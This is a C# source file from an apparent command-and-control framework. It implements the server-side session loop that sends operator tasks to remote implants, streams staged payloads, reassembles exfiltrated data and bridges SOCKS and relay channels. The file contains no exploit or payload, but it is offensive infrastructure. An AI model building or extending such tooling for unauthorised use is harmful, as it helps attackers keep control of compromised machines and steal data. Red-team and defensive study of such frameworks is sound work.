using System.Collections.Concurrent;
using Google.Protobuf;
using Rod.CoreState;
using Rod.CoreState.Application;
using Rod.CoreState.Sessions;
using Rod.CoreState.Tasks;
using Rod.Transport.Channels;
using Rod.V1;
// The domain entity shares its name with the BCL Task; the runner uses the
// Tasks namespace for the service types but never the entity by name, so pin
// Task to the BCL type the signatures need.
using Task = System.Threading.Tasks.Task;

namespace Rod.Transport.Endpoints;

// The transport-agnostic tasking session (architecture.md Sec 10.3): the
// reader/writer pair every live beacon stream runs, extracted from the
// retired gRPC endpoint so a later framing (the WebSocket stream the web posture carries)
// adapts the same core instead of copying it. Everything between the
// handshake and the connection's end lives here; the handshake and its
// identity rules stay with each transport, because that is exactly where
// transports differ (a client certificate over mTLS, the sealed envelope's
// artifact key over the web posture).

/// <summary>
/// Reads the next upstream frame, or null on a clean client close. The
/// adapter owns the transport's receive semantics; an aborted connection
/// surfaces as the transport's own exception.
/// </summary>
internal delegate Task<Frame?> BeaconFrameReader(CancellationToken cancellationToken);

/// <summary>Writes one downstream frame.</summary>
internal delegate Task BeaconFrameWriter(Frame frame, CancellationToken cancellationToken);

/// <summary>
/// Runs one live tasking session over an adapted duplex frame pipe: a reader
/// draining result frames and a writer pushing queued tasks downstream, run
/// concurrently. Concurrency is required because tasks enter the queue
/// out-of-band -- an operator POSTs them over HTTP, not over this stream --
/// so the writer must sit ready on the dispatch wake even while the reader is
/// blocked awaiting the next result. A strictly sequential read-then-dispatch
/// would deadlock: the reader blocks on a result the implant never sends
/// because the task that prompts it is still queued.
/// </summary>
internal sealed class BeaconSessionRunner
{
    private readonly ISessionRegistry _sessions;
    private readonly TaskService _tasks;
    private readonly TimeProvider _clock;
    private readonly ITaskDispatchWake _wake;
    private readonly LiveChannelHub _channels;
    private readonly Rod.Transport.Channels.DegradedChannelHub _degraded;
    private readonly TaskRelayHub _relays;
    private readonly SocksProxyHub _socks;
    private readonly BeaconIngest _ingest;
    private readonly BeaconTasking _tasking;

    public BeaconSessionRunner(
        ISessionRegistry sessions,
        TaskService tasks,
        TimeProvider clock,
        ITaskDispatchWake wake,
        LiveChannelHub channels,
        Rod.Transport.Channels.DegradedChannelHub degraded,
        TaskRelayHub relays,
        SocksProxyHub socks,
        BeaconIngest ingest,
        BeaconTasking tasking)
    {
        _sessions = sessions;
        _tasks = tasks;
        _clock = clock;
        _wake = wake;
        _channels = channels;
        _degraded = degraded;
        _relays = relays;
        _socks = socks;
        _ingest = ingest;
        _tasking = tasking;
    }

    /// <summary>
    /// The session is live and the stream is the tasking channel: hold it
    /// open, draining results and pushing queued tasks until either loop ends
    /// (a clean client close in the reader, cancellation). The stream ending
    /// does NOT close the session: a session is the implant's live channel,
    /// not one connection -- a poll-mode implant ends every contact stream
    /// and opens the next seconds later. Liveness is last-seen based; the
    /// staleness sweeper closes the session after the configured silence
    /// threshold, and retirement closes it immediately.
    /// </summary>
    /// <param name="carrier">
    /// The carrier name the session's presence stamps ride (the roster's
    /// degraded-mode badge reads it): "web" for the web family (the envelope
    /// POST cycle or the WebSocket beacon), "dns" for the TXT polls, "pipe"
    /// for the socket family's held connection.
    /// </param>
    public async Task RunAsync(
        BeaconSessionContext session,
        BeaconFrameReader read,
        BeaconFrameWriter write,
        CancellationToken cancellationToken,
        string carrier)
    {
        using var linked = CancellationTokenSource.CreateLinkedTokenSource(cancellationToken);
        // This stream's connection share of the shared frame ingest: the exfil
        // reassembly buffers and channel decoders live and die with the stream.
        var connection = _ingest.OpenConnection();
        // Per-stream staged-pull queue: the reader accepts the implant's
        // demands (architecture.md Sec 10, the typed arm) and the writer --
        // the stream's sole frame writer -- streams the demanded bytes
        // downstream. The dispatch wake doubles as the handoff: a demand
        // releases the implant's wake, so the parked writer wakes and drains.
        var pulls = new ConcurrentQueue<StagedPullDemand>();
        // The stream's channel sink (architecture.md Sec 10.3, the streaming
        // task shape): the operator input route enqueues onto it over HTTP and
        // the writer drains it downstream as ChannelInput frames. Registered
        // in the hub for the implant's lifetime of this stream; the using
        // detaches it on stream end, leaving a newer stream's registration
        // alone.
        var inputs = new BeaconChannelSink(_wake, session.Implant);
        using var attached = _channels.Attach(session.Implant, inputs);
        // A poll-mode session (architecture.md Sec 10.3, the store-and-forward
        // carriage): operator input that arrived while no stream was open
        // parked in the degraded hub -- flush it onto this stream the moment
        // it opens, the same drain the poll carriers' contact paths apply,
        // and sweep the channels the implant stopped collecting.
        if (session.Capabilities.Contains(Rod.Transport.Channels.DegradedChannelHub.Capability))
        {
            await _degraded.SweepIdleAsync(linked.Token);
            foreach (var frame in _degraded.Drain(session.Implant, int.MaxValue))
                await write(frame, linked.Token);
        }
        // This stream's ack-less dispatch ledger (architecture.md Sec 10.3 --
        // the dispatch strand on a dying stream): the writer adds each
        // dispatched task the handshake's receive-ack negotiation covers, the
        // reader clears each as its ack crosses, and whatever survives to the
        // stream's end is requeued below -- a task whose frame died with the
        // connection rides the next contact instead of stranding Dispatched.
        // Concurrent because the writer adds while the reader clears.
        var unacked = new ConcurrentDictionary<TaskId, byte>();
        // The exfil seam reports this stream owes its implant (ADR-010's
        // upload arm): the reader collects them as offset-bearing chunks
        // place, the writer -- the stream's sole frame writer -- pushes them
        // downstream. Concurrent for the same reason the dispatch ledger is.
        var exfilProgress = new ConcurrentQueue<Frame>();
        var reader = ReadResultsAsync(session, connection, read, pulls, unacked, exfilProgress, linked, carrier);
        var writer = DispatchTasksAsync(session, pulls, inputs, write, unacked, exfilProgress, linked.Token);

        // Whichever finishes first cancels the other. The writer only ever ends
        // via cancellation (its loop runs for the session). How the first
        // loop ended is held back -- an aborted read is precisely the death
        // the dispatch strand below exists for, and rethrowing here (the old
        // shape) skipped the strand close entirely, stranding every ack-less
        // dispatch in Dispatched. The fault rethrows after the unwind, with
        // its original stack.
        var ended = await Task.WhenAny(reader, writer);
        linked.Cancel();
        try
        {
            await Task.WhenAll(reader, writer);
        }
        catch (OperationCanceledException)
        {
            // Expected: the cancelled loop unwinds through the wake wait.
        }
        catch
        {
            // The same fault the held-back rethrow below carries; it is
            // observed here only so WhenAll does not hide it.
        }

        // The stream is gone: close the dispatch strand it carried. Every
        // dispatch still holding no ack is returned to the queue, so the
        // implant's next contact redelivers it -- the at-least-once trade the
        // arm negotiated, safe because a redelivered task an implant already
        // held is re-acked without running twice. A task that completed in the
        // race (its result crossed on another stream after its ack died with
        // this one) refuses the requeue and stands completed: the first result
        // wins. Streams whose handshake did not negotiate the arm hold nothing
        // here -- a written frame counts as delivered, today's semantics.
        foreach (var pending in unacked.Keys)
        {
            try
            {
                await _tasks.RequeueAsync(pending, CancellationToken.None);
            }
            catch (InvalidOperationException)
            {
                // The task left Dispatched between the ledger check and here
                // (completed on an overlapping stream); its result stands.
            }
        }

        // The stream is gone, and a channel is session-scoped (architecture.md
        // Sec 10.3): any relay bridged onto this implant's channels dies with
        // it, so the operator-side tool's connection ends instead of staring
        // at a listener nothing more will cross.
        _relays.CloseImplant(session.Implant, "the implant's beacon stream ended");
        _socks.CloseImplant(session.Implant, "the implant's beacon stream ended");

        // Surface how the stream ended, exactly as the first-completed loop
        // saw it -- after the strand closed, never instead of it.
        if (ended.IsFaulted)
            await ended;
    }

    // Reader: await each upstream frame, capture it into the task and append the
    // audit event, or -- when the frame is an ExfilChunk -- reassemble and store
    // the artifact. Each frame also advances the session's last-seen stamp, so
    // the presence roster reflects real activity, not just stream open/close.
    // Ends on a clean client close (the reader returns null); throws on an abort.
    private async Task ReadResultsAsync(
        BeaconSessionContext session,
        BeaconConnectionIngest connection,
        BeaconFrameReader read,
        ConcurrentQueue<StagedPullDemand> stagedPulls,
        ConcurrentDictionary<TaskId, byte> unacked,
        ConcurrentQueue<Frame> exfilProgress,
        CancellationTokenSource linked,
        string carrier)
    {
        var cancellationToken = linked.Token;
        while (await read(cancellationToken) is { } frame)
        {
            await _sessions.TouchAsync(
                session.Implant, session.Capabilities, _clock.GetUtcNow(), carrier, cancellationToken);

            // The session may have been closed out from under this stream -- the
            // staleness sweep, or a reconnect that opened a newer session for
            // the implant. TouchAsync is a no-op then, so every later frame would
            // keep refreshing a session this stream no longer holds; end the
            // stream instead so the implant reconnects and re-handshakes (its
            // beacon loop treats a dropped stream as a normal reconnect).
            var active = await _sessions.GetActiveAsync(session.Implant, cancellationToken);
            if (active is null || active.Id != session.SessionId)
            {
                linked.Cancel();
                return;
            }

            await connection.IngestAsync(
                session,
                frame,
                stagedPullSink: demand =>
                {
                    stagedPulls.Enqueue(demand);
                    _wake.Release(session.Implant);
                },
                taskAckSink: taskId => unacked.TryRemove(taskId, out _),
                cancellationToken);

            // Offset-bearing exfil chunks placed on this stream answer with
            // their seam report (ADR-010's upload arm): hand it to the writer
            // and release the wake so it leaves promptly rather than at the
            // next dispatch.
            foreach (var progress in connection.TakeExfilProgress())
            {
                exfilProgress.Enqueue(progress);
                _wake.Release(session.Implant);
            }
        }
    }

    // Writer: push queued tasks downstream the moment they are queued, and
    // stream staged payloads the moment they are demanded. Operators task
    // implants over HTTP at any moment, so this loops for the life of the
    // session rather than draining once. Each iteration claims first --
    // covering tasks queued before the stream opened and dispatches returned
    // to the queue by a failed write -- drains any staged pulls the reader
    // accepted, then parks on the per-implant dispatch wake, which TaskService
    // releases on every accepted enqueue and the reader releases on every
    // demand. No poll: a queued task is pushed on release, and an idle stream
    // claims nothing (architecture.md Sec 10.3).
    private async Task DispatchTasksAsync(
        BeaconSessionContext session,
        ConcurrentQueue<StagedPullDemand> stagedPulls,
        BeaconChannelSink inputs,
        BeaconFrameWriter write,
        ConcurrentDictionary<TaskId, byte> unacked,
        ConcurrentQueue<Frame> exfilProgress,
        CancellationToken cancellationToken)
    {
        while (!cancellationToken.IsCancellationRequested)
        {
            await DispatchNextAsync(session, write, unacked, cancellationToken);
            await StreamStagedPullsAsync(stagedPulls, write, cancellationToken);
            await StreamExfilProgressAsync(exfilProgress, write, cancellationToken);
            await StreamChannelInputsAsync(inputs, write, cancellationToken);
            await _wake.WaitAsync(session.Implant, cancellationToken);
        }
    }

    // Pushes the seam reports the reader collected (ADR-010's upload arm),
    // one frame per stream the contact placed offset-bearing chunks for, at
    // the store's freshest held count.
    private static async Task StreamExfilProgressAsync(
        ConcurrentQueue<Frame> exfilProgress,
        BeaconFrameWriter write,
        CancellationToken cancellationToken)
    {
        while (exfilProgress.TryDequeue(out var frame))
            await write(frame, cancellationToken);
    }

    // Drains the operator input the route queued onto this stream's sink, one
    // ChannelInput frame per unit (architecture.md Sec 10.3): the streaming
    // counterpart of DispatchNextAsync. The route validated the task before
    // enqueueing; this is pure transport -- frame the bytes and write them to
    // the implant that runs the channel.
    private static async Task StreamChannelInputsAsync(
        BeaconChannelSink inputs,
        BeaconFrameWriter write,
        CancellationToken cancellationToken)
    {
        while (inputs.TryDequeue(out var unit))
        {
            var input = new ChannelInput
            {
                TaskId = new TaskId(unit.TaskId).ToString(),
                Eof = unit.Eof,
            };
            if (unit.Data.Length > 0)
                input.Data = ByteString.CopyFrom(unit.Data);
            await write(
                new Frame
                {
                    Payload = ByteString.CopyFrom(input.ToByteArray()),
                    Kind = FrameKind.ChannelInput,
                },
                cancellationToken);
        }
    }

    // Pulls the next queued task for the implant -- widened to the Pivot
    // children it fronts (architecture.md Sec 5.2): a fronted child's task is
    // claimed here, marked with the child's id on the frame, and executed by
    // this stream on the child's behalf. A no-op write when nothing is queued.
    // A dispatch the handshake's receive-ack negotiation covers enters the
    // stream's ack-less ledger here, and leaves it only through its ack.
    private async Task DispatchNextAsync(
        BeaconSessionContext session,
        BeaconFrameWriter write,
        ConcurrentDictionary<TaskId, byte> unacked,
        CancellationToken cancellationToken)
    {
        var dispatched = await _tasks.DispatchNextAsync(
            session.Implant, cancellationToken, includeFronted: true);
        if (dispatched is null)
            return;

        var frame = await _tasking.MarshalFrameAsync(dispatched, session.Implant, cancellationToken);

        // Write downstream first: the dispatch audit records a task the implant
        // actually received. When the write fails, the task returns to the queue
        // so a later contact redelivers it -- a task whose frame never left the
        // server must not strand in Dispatched (architecture.md Sec 10.3).
        try
        {
            await write(frame, cancellationToken);
        }
        catch
        {
            await _tasks.RequeueAsync(dispatched.TaskId, CancellationToken.None);
            throw;
        }

        await _tasking.RecordDispatchAsync(dispatched, cancellationToken);
        if (session.TaskAcks)
            unacked[dispatched.TaskId] = 0;
    }

    // Streams every demanded staged payload downstream, one StagedChunk run
    // per demand (architecture.md Sec 10, the typed arm) -- a resumed demand
    // (ADR-010) answers from the offset it proved, so a dropped stream costs
    // the unserved remainder, not the whole payload.
    private async Task StreamStagedPullsAsync(
        ConcurrentQueue<StagedPullDemand> stagedPulls,
        BeaconFrameWriter write,
        CancellationToken cancellationToken)
    {
        while (stagedPulls.TryDequeue(out var demand))
        {
            foreach (var frame in await _tasking.StagedChunkRunAsync(
                         demand.Task.Value, demand.Offset, demand.PrefixSha256, cancellationToken))
                await write(frame, cancellationToken);
        }
    }
}
